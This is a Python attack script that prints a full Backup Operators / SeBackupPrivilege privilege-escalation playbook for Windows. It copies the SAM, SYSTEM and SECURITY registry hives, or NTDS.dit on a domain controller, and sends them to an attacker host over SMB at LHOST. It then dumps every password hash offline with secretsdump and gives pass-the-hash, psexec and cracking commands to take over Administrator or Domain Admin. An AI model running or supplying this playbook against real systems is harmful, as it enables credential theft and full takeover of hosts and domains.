#!/usr/bin/env python3
"""SeBackupPrivilege / SeRestorePrivilege / "Backup Operators" privesc -> offline hash dump.

These privileges let you READ any file bypassing the DACL — including the locked registry
hives that hold the local password hashes (SAM+SYSTEM) and cached/domain secrets (SECURITY).
You don't get a shell directly: you copy the hives out, dump the hashes OFFLINE on the
attacker, then Pass-the-Hash / crack to Administrator (or, on a DC, dump NTDS.dit for every
domain account). This is the standard Backup-Operators-to-DA route.

PRINTS the target-side copy commands + the attacker-side secretsdump line. No payload to compile.
Edit LHOST/LPORT in _winpriv_common.py.

Usage:
  python3 gen_hashdump.py [--mode local|dc] [--dst C:\\Windows\\Temp]

Confirm the privilege first (from your foothold):
  whoami /priv        -> SeBackupPrivilege / SeRestorePrivilege  (Enabled)
  whoami /groups      -> BUILTIN\\Backup Operators
"""
import sys
import _winpriv_common as P

def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

mode = opt("--mode", "local")
dst  = opt("--dst", P.STAGE).rstrip("\\")

print(f"# SeBackup/Backup-Operators hash dump   mode={mode}   staging={dst}")
print(f"# 0) confirm:  whoami /priv | findstr /i backup     (SeBackupPrivilege = Enabled)\n")

if mode == "local":
    print("# 1a) EASY: reg save (works when SeBackupPrivilege is Enabled — no special tool):")
    print(f"reg save HKLM\\SAM {dst}\\sam.hiv")
    print(f"reg save HKLM\\SYSTEM {dst}\\system.hiv")
    print(f"reg save HKLM\\SECURITY {dst}\\security.hiv     REM cached domain creds / LSA secrets\n")
    print("# 1b) IF reg save is blocked but you hold SeBackup: use the backup-intent APIs instead —")
    print("#     diskshadow VSS snapshot, or robocopy /b, or the PowerShell SeBackupPrivilege module.")
    print(f"robocopy /b C:\\Windows\\System32\\config {dst} SAM SYSTEM SECURITY   REM /b = backup-semantics read\n")
    hives = "sam.hiv system.hiv security.hiv"
    print("# 2) exfil the hives to the attacker (pick one):")
    print(f"#   SMB:   copy {dst}\\sam.hiv \\\\{P.LHOST}\\share\\   (impacket-smbserver share . -smb2support)")
    print(f"#   HTTP:  (upload) or pull them with certutil FROM the attacker side if you have a listener")
    print(f"#   b64 :  certutil -encode {dst}\\sam.hiv {dst}\\sam.b64  -> paste back  (repeat per hive)\n")
    print("# 3) dump hashes OFFLINE on the attacker (impacket):")
    print(f"secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL")
    print("#    -> local Administrator NTLM hash. Then Pass-the-Hash or crack:")
    print(f"#    nxc smb <target> -u Administrator -H <nthash>                                       (verify PtH; netexec)")
    print(f"#    psexec.py Administrator@<target> -hashes :<nthash>                                   (SYSTEM shell)")
    print("#    hashcat -m 1000 <nthash> rockyou.txt                                                 (or crack it)\n")
    print("# 4) cleanup:  del " + f"{dst}\\sam.hiv {dst}\\system.hiv {dst}\\security.hiv")

elif mode == "dc":
    print("# ON A DOMAIN CONTROLLER — dump NTDS.dit (every domain account's hash) via a VSS snapshot:")
    print("#   (SeBackup lets you read the locked NTDS.dit + SYSTEM hive)")
    print("diskshadow /s -   REM feed it: set context persistent nowriters / add volume C: alias z / create / expose %z% X:")
    print("#   ...or one-shot with the ntdsutil built-in:")
    print(f"ntdsutil \"activate instance ntds\" \"ifm\" \"create full {dst}\\ifm\" quit quit")
    print(f"#   -> {dst}\\ifm\\Active Directory\\ntds.dit  +  {dst}\\ifm\\registry\\SYSTEM\n")
    print("# exfil both, then OFFLINE on the attacker:")
    print("secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL")
    print("#   -> hashes for EVERY domain user incl. krbtgt (golden-ticket) + Domain Admins.")
    print("#   Then: psexec.py -hashes :<da_nthash> Administrator@<dc>   (Domain Admin).\n")
    print(f"# cleanup:  rmdir /s /q {dst}\\ifm")
else:
    print("mode must be 'local' or 'dc'"); sys.exit(1)

print("\n# NOTE: SeBackupPrivilege is READ-any-file; SeRestorePrivilege is WRITE-any-file")
print("#       (overwrite a service binary / drop a DLL in System32 → SYSTEM). Backup Operators holds both.")
